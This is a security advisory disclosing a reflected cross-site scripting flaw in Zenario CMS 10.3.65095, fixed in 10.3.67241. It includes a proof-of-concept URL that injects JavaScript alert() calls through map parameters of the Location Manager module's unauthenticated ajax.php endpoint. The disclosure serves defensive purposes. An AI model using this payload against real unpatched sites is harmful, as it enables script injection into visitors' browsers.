# Security Advisory: Reflected XSS in Zenario CMS 10.3.65095

**CVE ID:** (pending)  
**CVSS 4.0:** 7.6 (High) (AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N)   
**Affected version:** Zenario CMS 10.3.65095  
**Fixed version:** Zenario CMS 10.3.67241  
**Researcher:** Bui Minh Dang — VLC Security Lab, Japan  

---

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability was discovered in 
Zenario CMS 10.3.65095. The vulnerability exists in an endpoint used by the Location Manager module and is exploitable by any unauthenticated visitor when the module is set to Running.

---

## Proof of Concept
**Prerequisites:** The `zenario_location_manager` module must be set to Running.

PoC URL (replace `<host>` with the target hostname):
```
http://<host>/zenario/ajax.php?map_center_lat=1;alert(1)&map_center_lng=1;alert(5)&zoom=1;alert(6)&marker_lat=1;alert(2)&marker_lng=1;alert(4)&method_call=showFile&moduleClassName=zenario_location_manager
```

No cookies or session token are required. Opening the following URL directly in a browser executes the injected JavaScript.

<img width="971" height="775" alt="fisrt cve" src="https://github.com/user-attachments/assets/b9d211d8-ec9d-427f-98f9-c8c921b65e2d" />

---

## References

- Vendor release: https://github.com/TribalSystems/Zenario/releases/tag/10.3.67241
- CVE: pending
